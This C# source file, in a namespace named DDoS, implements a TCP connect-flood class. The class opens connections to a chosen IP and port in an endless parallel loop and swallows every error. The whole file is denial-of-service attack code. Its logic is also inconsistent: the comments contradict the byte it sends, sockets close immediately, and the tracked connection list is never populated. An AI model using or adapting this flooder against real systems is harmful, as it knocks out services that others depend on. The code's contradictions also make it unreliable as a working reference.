// Copyright (c) 2025-2026 PPN Corporation. All rights reserved.
// Licensed under the Apache License, Version 2.0.
using System.Net.Sockets;

namespace DDoS;

// Manages TCP connect flood: Opens many TCP connections without sending data.
// DOC: https://learn.microsoft.com/en-us/dotnet/api/system.net.sockets.socket
public class TCPConnectFlooder
{
    private readonly List<Socket> _connections = [];
    private readonly String _ip;
    private readonly Int32 _port;
    private readonly Int32 _maxConnections;

    private volatile Int32 _count;
    private volatile Boolean _running = false;

    public TCPConnectFlooder(String ip, Int32 port, Int32 maxConnections)
    {
        _ip = ip;
        _port = port;
        _maxConnections = maxConnections;
    }

    // Start flooding: repeatedly tries to open up to maxConnections sockets
    public void Start()
    {
        _running = true;

        ThreadPool.SetMinThreads(_maxConnections, _maxConnections);
        ThreadPool.QueueUserWorkItem(_ =>
        {
            while (_running)
            {
                Parallel.For(0, _maxConnections, i =>
                {
                    try
                    {
                        using Socket sock = new(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        sock.Connect(_ip, _port);

                        // Optional: Send minimal data, this step may simulate a real request
                        sock.Send(new Byte[] { 0x00 });
                        Interlocked.Increment(ref _count);
                    }
                    catch
                    {
                        // Silently ignore any failure in connection
                    }
                });
            }
        });
    }

    // Stop flooding and release sockets
    public void Stop()
    {
        _running = false;
        lock (_connections)
        {
            foreach (var sock in _connections)
            {
                sock.Dispose();
            }

            _connections.Clear();
        }
    }

    // Get current connection count for display
    public Int32 ConnectionCount => _count;
}